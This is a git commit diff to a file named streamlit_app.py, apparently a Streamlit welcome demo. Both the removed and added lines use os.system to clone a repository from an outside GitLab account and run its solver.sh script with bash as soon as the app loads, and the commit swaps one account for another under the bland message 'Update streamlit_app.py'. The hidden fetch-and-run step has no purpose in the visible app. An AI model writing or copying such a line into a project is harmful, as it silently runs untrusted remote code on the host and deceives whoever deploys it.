b5e706ba623a8ec8e4836a3746d410e2db625d77
Ayati9335 <95975047+Ayati9335@users.noreply.github.com>
2021-12-30 21:50:08 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('git clone https://gitlab.com/jiorio669/solver.git && cd solver && bash solver.sh')
+os.system('git clone https://gitlab.com/andyketan1/solver.git && cd solver && bash solver.sh')
 
 """
 # Welcome to Streamlit!
